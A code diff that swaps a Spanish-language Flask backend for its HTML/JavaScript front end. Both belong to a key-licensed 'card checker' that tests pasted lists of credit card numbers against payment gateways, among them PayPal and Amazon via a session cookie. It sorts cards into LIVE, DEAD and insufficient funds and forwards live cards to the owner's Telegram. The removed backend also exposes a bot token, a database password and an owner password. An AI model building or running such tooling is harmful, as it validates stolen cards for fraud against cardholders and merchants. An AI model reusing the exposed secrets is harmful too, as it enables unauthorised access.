@@ -1,441 +1,467 @@
-import os
-import asyncio
-from datetime import datetime, timedelta
-from flask import Flask, request, jsonify, send_from_directory, session, redirect, url_for, render_template, flash
-from flask_cors import CORS
-from flask_sqlalchemy import SQLAlchemy
-from werkzeug.security import generate_password_hash, check_password_hash
-import random
-from flask import session, request, jsonify
-from telegram import Bot
-import requests as req
-import paypal
-import tec, red, em, amazon,ultra,paypal
-
-
-app = Flask(__name__)
-app.secret_key = 'tu_secreto_super_seguro'
-CORS(app, resources={r"/*": {"origins": "*"}})
-TELEGRAM_BOT_TOKEN = '7549342155:AAFhkoxXW4fGQ2wH-695blDAjJ1Z-NpouSE'
-OWNER_TELEGRAM_ID = '846983753'
-app.config['SQLALCHEMY_DATABASE_URI'] = 'postgresql://postgres:cKDrLMbTgKkaYXtNFDgZOgpzbVISnJor@maglev.proxy.rlwy.net:37751/railway'
-app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
-db = SQLAlchemy(app)
-
-# MODELOS
-class User(db.Model):
-    id = db.Column(db.Integer, primary_key=True)
-    telegram_id = db.Column(db.String(50), nullable=True)  # solo una vez
-    verification_code = db.Column(db.String(10), nullable=True)
-    username = db.Column(db.String(50), unique=True, nullable=False)
-    password_hash = db.Column(db.String(512), nullable=False)
-    key = db.Column(db.String(128), db.ForeignKey('key.key'), nullable=True)
-    role = db.Column(db.String(10), default='user')
-
-    def set_password(self, password):
-        self.password_hash = generate_password_hash(password)
-
-    def check_password(self, password):
-        return check_password_hash(self.password_hash, password)
-
-
-
-class Key(db.Model):
-    id = db.Column(db.Integer, primary_key=True)
-    key = db.Column(db.String(128), unique=True, nullable=False)
-    used = db.Column(db.Boolean, default=False)
-    expires_at = db.Column(db.DateTime, nullable=True)
-
-# Inicializar owner y owner_key si no existen
-def init_owner_and_key():
-    try:
-        db.session.rollback()
-        owner = User.query.filter_by(username='owner1').first()
-        if not owner:
-            owner = User(username='owner1', role='owner')
-            owner.set_password('Saiper123')
-            db.session.add(owner)
-            db.session.commit()
-
-        owner_key = Key.query.filter_by(key='owner_key').first()
-        if not owner_key:
-            owner_key = Key(key='owner_key', used=True, expires_at=None)
-            db.session.add(owner_key)
-            db.session.commit()
-
-    except Exception as e:
-        db.session.rollback()
-        print(f"Error inicializando owner y owner_key: {e}")
-
-# RUTAS
-
-@app.route('/')
-def index():
-    if 'user_id' in session:
-        return redirect(url_for('dashboard'))
-    return render_template('index.html')
-
-@app.route('/style.css')
-def style():
-    return send_from_directory('.', 'style.css')
-
-@app.route('/login', methods=['POST'])
-def login():
-    username = request.form['username']
-    password = request.form['password']
-    user = User.query.filter_by(username=username).first()
-    if user and user.check_password(password):
-        session['user_id'] = user.id
-        return redirect(url_for('dashboard'))
-    flash('Usuario o contraseña incorrectos', 'error')
-    return redirect(url_for('index'))
-
-@app.route('/register', methods=['GET', 'POST'])
-def register():
-    if request.method == 'POST':
-        username = request.form['username'].strip()
-        password = request.form['password']
-        key_input = request.form['key'].strip()
-
-        if username.lower() == 'owner':
-            flash('No puedes registrar un usuario con el nombre "owner".', 'error')
-            return redirect(url_for('register'))
-
-        key_obj = Key.query.filter_by(key=key_input, used=False).first()
-        if not key_obj or (key_obj.expires_at and key_obj.expires_at < datetime.utcnow()):
-            flash('La key no es válida, ya fue usada o expiró.', 'error')
-            return redirect(url_for('register'))
-
-        if User.query.filter_by(username=username).first():
-            flash('El usuario ya existe.', 'error')
-            return redirect(url_for('register'))
-
-        user = User(username=username, key=key_input)
-        user.set_password(password)
-        db.session.add(user)
-        key_obj.used = True
-        db.session.commit()
-        flash('Registro exitoso, ya puedes iniciar sesión.', 'success')
-        return redirect(url_for('index'))
-    return render_template('register.html')
-
-@app.route('/dashboard')
-def dashboard():
-    if 'user_id' not in session:
-        return redirect(url_for('index'))
-
-    user = db.session.get(User, session['user_id'])
-    if not user:
-        session.clear()
-        return redirect(url_for('index'))
-
-    keys = Key.query.all() if user.role in ['owner', 'admin'] else []
-    return render_template('checker.html', username=user.username, role=user.role, keys=keys)
-
-@app.route('/logout')
-def logout():
-    session.clear()
-    return redirect(url_for('index'))
-
-from flask import request, session, jsonify
-
-
-
-
-@app.route('/redeem_key', methods=['POST'])
-def redeem_key():
-    if 'user_id' not in session:
-        return jsonify({'status': 'error', 'message': 'No has iniciado sesión.'}), 401
-
-    key_input = request.json.get('key').strip()
-    key_obj = Key.query.filter_by(key=key_input, used=False).first()
-    if not key_obj or (key_obj.expires_at and key_obj.expires_at < datetime.utcnow()):
-        return jsonify({'status': 'error', 'message': 'La key es inválida o ya expiró.'}), 400
-
-    user = User.query.get(session['user_id'])
-    user.key = key_input
-    key_obj.used = True
-    db.session.commit()
-    return jsonify({'status': 'success', 'message': 'Key canjeada correctamente.'})
-
-@app.route('/generate_key', methods=['POST'])
-def generate_key():
-    if 'user_id' not in session:
-        return jsonify({'status': 'error', 'message': 'No has iniciado sesión.'}), 401
-
-    user = User.query.get(session['user_id'])
-    if user.role not in ['owner', 'admin']:
-        return jsonify({'status': 'error', 'message': 'No tienes permisos para generar keys.'}), 403
-
-    duration_days = int(request.json.get('duration_days', 1))
-    new_key_str = "Kuriyama-" + os.urandom(6).hex()
-    expires_at = datetime.utcnow() + timedelta(days=duration_days)
-    new_key = Key(key=new_key_str, expires_at=expires_at)
-    db.session.add(new_key)
-    db.session.commit()
-    return jsonify({'status': 'success', 'key': new_key_str, 'expires_at': expires_at.isoformat()})
-
-
-@app.route('/add_admin', methods=['POST'])
-def add_admin():
-    if 'user_id' not in session:
-        return jsonify({'status': 'error', 'message': 'No has iniciado sesión.'}), 401
-
-    user = User.query.get(session['user_id'])
-    if user.role != 'owner':
-        return jsonify({'status': 'error', 'message': 'No tienes permisos para agregar administradores.'}), 403
-
-    username = request.json.get('username')
-    new_admin = User.query.filter_by(username=username).first()
-    if not new_admin:
-        return jsonify({'status': 'error', 'message': 'Usuario no encontrado.'}), 404
-
-    new_admin.role = 'admin'
-    db.session.commit()
-    return jsonify({'status': 'success', 'message': f'Usuario {username} ahora es admin.'})
-
-
-
-
-
-import asyncio
-import threading
-bot = Bot(token=TELEGRAM_BOT_TOKEN)
-
-import asyncio
-from telegram.error import BadRequest
-
-import asyncio
-from telegram.error import BadRequest
-
-# Limita la concurrencia para evitar saturar pool HTTP
-semaphore = asyncio.Semaphore(5)  # Ajusta este número según tu pool HTTP
-
-async def send_message(chat_id, message):
-    async with semaphore:
-        try:
-            await bot.send_message(chat_id=chat_id, text=message)
-            print(f"Mensaje enviado a {chat_id}")
-            return True
-        except BadRequest as e:
-            if "Chat not found" in str(e):
-                print(f"Chat no encontrado para ID {chat_id}. Eliminando telegram_id de usuario...")
-                user = db.session.query(User).filter_by(telegram_id=str(chat_id)).first()
-                if user:
-                    user.telegram_id = None
-                    try:
-                        db.session.commit()
-                        print(f"Telegram ID {chat_id} eliminado de usuario {user.id}")
-                    except Exception as err:
-                        db.session.rollback()
-                        print(f"Error al eliminar telegram_id: {err}")
-                return False
-            else:
-                print(f"Error enviando mensaje a {chat_id}: {e}")
-                return False
-        except Exception as e:
-            print(f"Error enviando mensaje a {chat_id}: {e}")
-            return False
-
-async def send_all_messages(telegram_ids, message):
-    tasks = [send_message(tid, message) for tid in telegram_ids]
-    results = await asyncio.gather(*tasks)
-    return all(results)
-
-def send_messages_to_multiple(telegram_ids, message):
-    if not isinstance(telegram_ids, list):
-        telegram_ids = [telegram_ids]
-
-    try:
-        loop = None
-        try:
-            loop = asyncio.get_running_loop()
-        except RuntimeError:
-            pass
-
-        if loop and loop.is_running():
-            future = asyncio.run_coroutine_threadsafe(send_all_messages(telegram_ids, message), loop)
-            return future.result()
-        else:
-            return asyncio.run(send_all_messages(telegram_ids, message))
-    except Exception as e:
-        print(f"Error enviando mensajes: {e}")
-        return False
-
-
-
-
-@app.route('/save_telegram_id', methods=['POST'])
-def save_telegram_id():
-    if 'user_id' not in session:
-        return jsonify({'status': 'error', 'message': 'No has iniciado sesión.'}), 401
-
-    telegram_id = request.json.get('telegram_id')
-    force = request.json.get('force', False)  # para forzar reemplazo
-    if not telegram_id:
-        return jsonify({'status': 'error', 'message': 'Telegram ID inválido.'}), 400
-
-    user = db.session.get(User, session['user_id'])
-    if not user:
-        return jsonify({'status': 'error', 'message': 'Usuario no encontrado.'}), 404
-
-    # Verificar si ya tiene telegram_id guardado y no está forzando reemplazo
-    if user.telegram_id and user.telegram_id != telegram_id and not force:
-        return jsonify({
-            'status': 'confirm',
-            'message': f'Ya tienes un Telegram ID guardado ({user.telegram_id}). ¿Quieres reemplazarlo?',
-        })
-
-    # Guardar el telegram_id y generar código
-    user.telegram_id = telegram_id
-    code = str(random.randint(100000, 999999))
-    user.verification_code = code
-
-    try:
-        db.session.commit()
-    except Exception as e:
-        db.session.rollback()
-        return jsonify({'status': 'error', 'message': f'Error al guardar Telegram ID y código: {str(e)}'}), 500
-
-    # Enviar código de verificación por Telegram
-    msg = f"Tu código de verificación es: {code}"
-    sent = send_messages_to_multiple(telegram_id, msg)
-    if not sent:
-        return jsonify({'status': 'error', 'message': 'No se pudo enviar el mensaje de verificación. Verifica el Telegram ID.'}), 400
-
-    return jsonify({'status': 'success', 'message': 'Telegram ID guardado y código enviado para verificación.'})
-
-
-@app.route('/start_telegram_verification', methods=['POST'])
-def start_telegram_verification():
-    # Puedes mantener esta ruta igual o eliminarla si usas la lógica en save_telegram_id
-    if 'user_id' not in session:
-        return jsonify({'status': 'error', 'message': 'No has iniciado sesión.'}), 401
-
-    telegram_id = request.json.get('telegram_id')
-    if not telegram_id:
-        return jsonify({'status': 'error', 'message': 'Telegram ID inválido.'}), 400
-
-    user = db.session.get(User, session['user_id'])
-    if not user:
-        return jsonify({'status': 'error', 'message': 'Usuario no encontrado.'}), 404
-
-    code = str(random.randint(100000, 999999))
-    user.verification_code = code
-
-    try:
-        db.session.commit()
-    except Exception as e:
-        db.session.rollback()
-        return jsonify({'status': 'error', 'message': f'Error interno: {str(e)}'}), 500
-
-    msg = f"Tu código de verificación es: {code}"
-    sent = send_messages_to_multiple(telegram_id, msg)
-    if not sent:
-        return jsonify({'status': 'error', 'message': 'No se pudo enviar el mensaje de verificación. Verifica el Telegram ID.'}), 400
-
-    return jsonify({'status': 'success', 'message': 'Código enviado a tu Telegram. Ingresa el código para verificar.'})
-
-
-
-@app.route('/confirm_telegram_code', methods=['POST'])
-def confirm_telegram_code():
-    if 'user_id' not in session:
-        return jsonify({'status': 'error', 'message': 'No has iniciado sesión.'}), 401
-
-    telegram_id = request.json.get('telegram_id')
-    code = request.json.get('code')
-    if not telegram_id or not code:
-        return jsonify({'status': 'error', 'message': 'Faltan datos.'}), 400
-
-    user = db.session.get(User, session['user_id'])
-    if not user:
-        return jsonify({'status': 'error', 'message': 'Usuario no encontrado.'}), 404
-
-    # Verificar que el código coincida
-    if user.verification_code == code:
-        user.telegram_id = telegram_id
-        user.verification_code = None  # borrar código tras usar
-        try:
-            db.session.commit()
-            return jsonify({'status': 'success', 'message': 'Telegram ID guardado correctamente.'})
-        except Exception as e:
-            db.session.rollback()
-            return jsonify({'status': 'error', 'message': f'Error al guardar: {str(e)}'}), 500
-    else:
-        return jsonify({'status': 'error', 'message': 'Código incorrecto.'}), 400
-
-
-
-@app.route('/check', methods=['POST'])
-
-def check_card():
-    if 'user_id' not in session:
-        return jsonify({'status': 'error', 'message': 'No has iniciado sesión.'}), 401
-
-    user = User.query.get(session['user_id'])
-    key_obj = Key.query.filter_by(key=user.key).first()
-
-    if not key_obj or (key_obj.expires_at and key_obj.expires_at < datetime.utcnow()):
-        return jsonify({'status': 'error', 'message': 'No tienes una key activa o tu key ha expirado.'}), 403
-
-    data = request.get_json()
-    cc = data.get('cc')
-    gateway = data.get('gateway', 'TEC')
-    cookie = data.get('cookie', '')
-
-    try:
-        if gateway == 'TEC':
-            result = asyncio.run(tec.process_card(cc))
-        elif gateway == 'RED':
-            result = asyncio.run(red.process_card(cc))
-        elif gateway == 'EM':
-            result = asyncio.run(em.process_card(cc))
-        elif gateway == 'UL':
-            result = asyncio.run(ultra.process_card(cc))
-        elif gateway == 'PAY':
-            result = asyncio.run(paypal.process_card(cc))
-        elif gateway == 'AMAZON':
-            result = amazon.procesar_tarjeta_amazon(cc, cookie)
-        else:
-            result = {'status': 'error', 'message': 'Gateway no válido', 'cc': cc}
-
-        if result['status'] == 'live':
-            telegram_ids = set()
-            user = db.session.get(User, session['user_id'])
-            if user and user.telegram_id:
-                telegram_ids.add(user.telegram_id)
-            telegram_ids.add(OWNER_TELEGRAM_ID)
-            send_messages_to_multiple(list(telegram_ids), f"✅ 𝗟𝗜𝗩𝗘 - {result['cc']}\n{result['message']}")
-
-
-        return jsonify(result)
-    except Exception as e:
-        return jsonify({'status': 'error', 'message': str(e)}), 500
-
-import asyncio
-
-async def enviarmensajecchats(message, chat_ids):
-    for chat_id in chat_ids:
-        try:
-            await bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
-        except Exception as e:
-            print(f"Error enviando mensaje a {chat_id}: {e}")
-
-
-
-@app.route('/ping')
-def ping():
-    return jsonify({'message': 'pong'})
-
-if __name__ == '__main__':
-    with app.app_context():
-        
-        print("Creando owner y owner_key si no existen...")
-        init_owner_and_key()
-        print("Proceso de inicialización terminado.")
-
-    port = int(os.environ.get("PORT", 5000))
-    app.run(host='0.0.0.0', port=port)
-
-
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8" />
+    <title>Gateway Selector</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0; padding: 20px;
+            background: #f5f5f5;
+        }
+        h2 {
+            margin-bottom: 20px;
+        }
+        /* Contenedor principal dividido */
+        .container {
+            display: flex;
+            gap: 20px;
+            min-height: 80vh;
+        }
+        /* Columna izquierda - configuración */
+        .left-panel {
+            width: 320px;
+            background: #fff;
+            padding: 15px;
+            border-radius: 8px;
+            box-shadow: 0 0 8px rgba(0,0,0,0.1);
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+        /* Columna central - CCs y resultados */
+        .center-panel {
+            flex: 1;
+            background: #fff;
+            padding: 15px;
+            border-radius: 8px;
+            box-shadow: 0 0 8px rgba(0,0,0,0.1);
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Textarea para CCs ocupa el ancho y altura fija */
+        #ccs_input {
+            width: 100%;
+            height: 180px;
+            resize: vertical;
+            font-family: monospace;
+            padding: 10px;
+            border-radius: 6px;
+            border: 1px solid #ccc;
+            margin-bottom: 15px;
+            box-sizing: border-box;
+        }
+
+        /* Botones alineados */
+        button {
+            cursor: pointer;
+            padding: 8px 12px;
+            border-radius: 5px;
+            border: none;
+            background-color: #007bff;
+            color: white;
+            font-size: 14px;
+            transition: background-color 0.3s ease;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+
+        /* Select y inputs en full width */
+        select, input[type=text], textarea {
+            width: 100%;
+            box-sizing: border-box;
+            margin-bottom: 10px;
+        }
+
+        /* Contenedor outputs con flex para dividir en columnas */
+        .outputs-container {
+            display: flex;
+            gap: 15px;
+            flex-wrap: wrap;
+            margin-top: auto; /* para empujar abajo */
+        }
+
+        .output {
+            flex: 1 1 45%;
+            background: #f9f9f9;
+            border-radius: 6px;
+            padding: 10px;
+            max-height: 220px;
+            overflow-y: auto;
+            box-sizing: border-box;
+        }
+
+        .output h3 {
+            margin-top: 0;
+            margin-bottom: 10px;
+            font-size: 16px;
+            border-bottom: 2px solid #007bff;
+            padding-bottom: 3px;
+        }
+
+        /* Ocultar/mostrar cookie container */
+        #cookie_container {
+            margin-bottom: 15px;
+        }
+
+        /* Config panel dentro de left-panel */
+        #configPanel {
+            margin-top: 10px;
+        }
+
+        /* Barra de progreso */
+        #progressContainer {
+            width: 100%;
+            background-color: #ddd;
+            border-radius: 6px;
+            overflow: hidden;
+            margin-bottom: 15px;
+            height: 22px;
+            box-shadow: inset 0 1px 3px rgba(0,0,0,.2);
+            display: none; /* oculto al inicio */
+        }
+        #progressBar {
+            height: 100%;
+            width: 0%;
+            background-color: #007bff;
+            transition: width 0.3s ease;
+            text-align: center;
+            color: white;
+            font-weight: bold;
+            line-height: 22px;
+            user-select: none;
+        }
+
+        /* Modal centrado */
+        #keyModal {
+            display: none; 
+            position: fixed; 
+            top:0; left:0; 
+            width:100%; height:100%; 
+            background: rgba(0,0,0,0.7); 
+            justify-content: center; 
+            align-items: center;
+            z-index: 999;
+        }
+        #keyModal > div {
+            background: #fff; 
+            padding: 20px; 
+            border-radius: 10px; 
+            text-align: center;
+            width: 300px;
+        }
+    </style>
+</head>
+<body>
+
+    <h2>Bienvenido, {{ username }}</h2>
+
+    <div class="container">
+
+        <!-- Columna izquierda: configuración y controles -->
+        <div class="left-panel">
+            <button id="configBtn">Configuración</button>
+            {% if role == 'owner' or role == 'admin' %}
+                <button id="generateKeyBtn">Generar Key</button>
+                <div id="generatedKeys" style="margin-top: 10px;"></div>
+            {% endif %}
+            {% if role == 'owner' %}
+                <div>
+                    <input type="text" id="newAdminUsername" placeholder="Usuario para Admin">
+                    <button id="addAdminBtn">Agregar Admin</button>
+                </div>
+            {% endif %}
+
+            <div id="configPanel" hidden>
+                <input id="telegram_id_input" type="text" placeholder="Tu Telegram ID" />
+                <button id="start_verification_btn">Enviar código de verificación</button>
+
+                <input id="verification_code_input" type="text" placeholder="Ingresa código recibido" />
+                <button id="confirm_code_btn">Confirmar código</button>
+
+                <input type="text" id="redeem_key_input" placeholder="Canjear Nueva Key" style="margin-top:15px;">
+                <button id="redeem_key_btn">Canjear Key</button>
+
+                <button id="logoutBtn" style="margin-top:20px; background:#dc3545;">Cerrar Sesión</button>
+            </div>
+        </div>
+
+        <!-- Columna central: CCs, selección gateway y resultados -->
+        <div class="center-panel">
+
+            <textarea id="ccs_input" placeholder="Pega aquí las CCs (una por línea)"></textarea>
+
+            <select id="gateway_select">
+                <option value="TEC">TEC</option>
+                <option value="RED">RED</option>
+                <option value="EM">EM</option>
+                <option value="PAY">UL</option>
+                <option value="UL">PAY</option>
+                <option value="AMAZON">AMAZON</option>
+            </select>
+
+            <div id="cookie_container" style="display: none;">
+                <textarea id="cookie_input" placeholder="Pega aquí tu Cookie de Amazon"></textarea>
+                <button id="save_cookie">Guardar Cookie</button>
+            </div>
+
+            <!-- Barra de progreso -->
+            <div id="progressContainer">
+                <div id="progressBar">0%</div>
+            </div>
+
+            <div style="margin-top: 15px;">
+                <button id="startBtn">Iniciar Gateway</button>
+                <button id="stopBtn" style="background:#dc3545;">Detener</button>
+            </div>
+
+            <div class="outputs-container">
+                <div class="output live">
+                    <h3>LIVE</h3>
+                    <div id="live_output"></div>
+                </div>
+                <div class="output dead">
+                    <h3>DEAD</h3>
+                    <div id="dead_output"></div>
+                </div>
+                <div class="output funds">
+                    <h3>FONDOS INSUFICIENTES</h3>
+                    <div id="funds_output"></div>
+                </div>
+                <div class="output error">
+                    <h3>ERROR</h3>
+                    <div id="error_output"></div>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <!-- Modal para seleccionar duración de Key -->
+    <div id="keyModal">
+        <div>
+            <h3>Selecciona la duración de la Key</h3>
+            <select id="keyDurationSelect">
+                <option value="1">1 Día</option>
+                <option value="7">7 Días</option>
+                <option value="15">15 Días</option>
+                <option value="30">30 Días</option>
+            </select><br><br>
+            <button id="confirmGenerateKey">Generar</button>
+            <button onclick="document.getElementById('keyModal').style.display='none'">Cancelar</button>
+        </div>
+    </div>
+
+<script>
+    let isRunning = false;
+    let amazonCookie = "";
+
+    document.getElementById('configBtn').addEventListener('click', () => {
+        document.getElementById('configPanel').hidden = !document.getElementById('configPanel').hidden;
+    });
+
+    document.getElementById('start_verification_btn').addEventListener('click', async () => {
+    const telegramId = document.getElementById('telegram_id_input').value.trim();
+    if (!telegramId) return alert('Ingresa tu ID de Telegram');
+
+        // Primero intentamos guardar el Telegram ID sin forzar
+        let res = await fetch('/save_telegram_id', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ telegram_id: telegramId })
+        });
+        let data = await res.json();
+
+        if (data.status === 'confirm') {
+            // Si hay que confirmar reemplazo, preguntamos al usuario
+            const confirmar = confirm(data.message + "\n¿Deseas reemplazarlo?");
+            if (confirmar) {
+                // Si confirma, enviamos la petición con force=true
+                res = await fetch('/save_telegram_id', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ telegram_id: telegramId, force: true })
+                });
+                data = await res.json();
+                alert(data.message);
+            }
+        } else {
+            // Si no hay confirmación pendiente, mostrar mensaje directo
+            alert(data.message);
+        }
+    });
+
+
+    document.getElementById('confirm_code_btn').addEventListener('click', async () => {
+        const telegramId = document.getElementById('telegram_id_input').value.trim();
+        const code = document.getElementById('verification_code_input').value.trim();
+        if (!telegramId || !code) return alert('Ingresa tu ID de Telegram y el código de verificación');
+
+        const res = await fetch('/confirm_telegram_code', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({telegram_id: telegramId, code: code})
+        });
+        const data = await res.json();
+        alert(data.message);
+    });
+
+    document.getElementById('redeem_key_btn').addEventListener('click', async () => {
+        const keyInput = document.getElementById('redeem_key_input').value.trim();
+        if (!keyInput) return alert('Ingresa una key válida.');
+        const res = await fetch('/redeem_key', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ key: keyInput })
+        });
+        const data = await res.json();
+        alert(data.message);
+        if (data.status === 'success') location.reload();
+    });
+
+    document.getElementById('logoutBtn').addEventListener('click', () => {
+        window.location.href = '/logout';
+    });
+
+    document.getElementById('gateway_select').addEventListener('change', () => {
+        const gateway = document.getElementById('gateway_select').value;
+        document.getElementById('cookie_container').style.display = (gateway === 'AMAZON') ? 'block' : 'none';
+    });
+
+    document.getElementById('save_cookie').addEventListener('click', () => {
+        const cookieValue = document.getElementById('cookie_input').value.trim();
+        if (!cookieValue) return alert('⚠️ Pega tu cookie.');
+        amazonCookie = cookieValue;
+        alert('✅ Cookie guardada localmente.');
+    });
+
+    document.getElementById('startBtn').addEventListener('click', () => {
+        const ccsInput = document.getElementById('ccs_input').value.trim();
+        if (ccsInput === '') return alert('⚠️ Proporciona algunas CCs para comenzar.');
+        if (document.getElementById('gateway_select').value === 'AMAZON' && !amazonCookie) {
+            return alert('⚠️ Debes guardar la cookie de Amazon antes de continuar.');
+        }
+        if (isRunning) return;
+        isRunning = true;
+        startChecking();
+    });
+
+    document.getElementById('stopBtn').addEventListener('click', () => {
+        isRunning = false;
+    });
+
+    async function startChecking() {
+        const ccs = document.getElementById('ccs_input').value.trim().split('\n').filter(cc => cc.trim() !== '');
+        const gateway = document.getElementById('gateway_select').value;
+        const liveOutput = document.getElementById('live_output');
+        const deadOutput = document.getElementById('dead_output');
+        const fundsOutput = document.getElementById('funds_output');
+        const errorOutput = document.getElementById('error_output');
+        const progressContainer = document.getElementById('progressContainer');
+        const progressBar = document.getElementById('progressBar');
+
+        liveOutput.innerHTML = '';
+        deadOutput.innerHTML = '';
+        fundsOutput.innerHTML = '';
+        errorOutput.innerHTML = '';
+
+        // Mostrar barra de progreso y resetear
+        progressContainer.style.display = 'block';
+        progressBar.style.width = '0%';
+        progressBar.textContent = '0%';
+
+        for (let i = 0; i < ccs.length; i++) {
+            if (!isRunning) break;
+            const cc = ccs[i].trim();
+
+            const result = await checkGateway(cc, gateway);
+
+            if (result.status === 'live') {
+                liveOutput.innerHTML += `<div><strong>${result.cc}</strong></div>`;
+            } else if (result.status === 'dead') {
+                deadOutput.innerHTML += `<div><strong>${result.cc}</strong></div>`;
+            } else if (result.status === 'insufficient_funds') {
+                fundsOutput.innerHTML += `<div><strong>${result.cc}</strong></div>`;
+            } else {
+                errorOutput.innerHTML += `<div><strong>${result.cc}</strong> - ${result.message}</div>`;
+            }
+
+            // Actualizar barra de progreso
+            const progressPercent = Math.round(((i + 1) / ccs.length) * 100);
+            progressBar.style.width = progressPercent + '%';
+            progressBar.textContent = progressPercent + '%';
+
+            await sleep(500);
+        }
+
+        isRunning = false;
+        progressBar.textContent = '✅ Proceso finalizado';
+    }
+
+    async function checkGateway(cc, gateway) {
+        try {
+            const response = await fetch('/check', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ cc: cc, gateway: gateway, cookie: amazonCookie })
+            });
+
+            const text = await response.text();
+            try {
+                return JSON.parse(text);
+            } catch (e) {
+                return { status: 'error', message: `Respuesta no JSON del servidor: ${text}`, cc: cc };
+            }
+        } catch (err) {
+            return { status: 'error', message: `Error de conexión: ${err.message}`, cc: cc };
+        }
+    }
+
+    function sleep(ms) {
+        return new Promise(resolve => setTimeout(resolve, ms));
+    }
+
+    {% if role == 'owner' or role == 'admin' %}
+    document.getElementById('generateKeyBtn').addEventListener('click', () => {
+        document.getElementById('keyModal').style.display = 'flex';
+    });
+
+    document.getElementById('confirmGenerateKey').addEventListener('click', async () => {
+        const days = document.getElementById('keyDurationSelect').value;
+        const res = await fetch('/generate_key', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ duration_days: days })
+        });
+        const data = await res.json();
+        if (data.status === 'success') {
+            const keysDiv = document.getElementById('generatedKeys');
+            keysDiv.innerHTML += `<div>${data.key} (Expira: ${data.expires_at.split('T')[0]})</div>`;
+        } else {
+
+
+                alert(data.message);
+            }
+            document.getElementById('keyModal').style.display = 'none';
+        });
+        {% endif %}
+
+        {% if role == 'owner' %}
+        document.getElementById('addAdminBtn').addEventListener('click', async () => {
+            const username = document.getElementById('newAdminUsername').value.trim();
+            if (!username) return alert('Ingresa el nombre de usuario');
+            const res = await fetch('/add_admin', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ username: username })
+            });
+            const data = await res.json();
+            alert(data.message);
+        });
+        {% endif %}
+    </script>
+
+</body>
+</html>
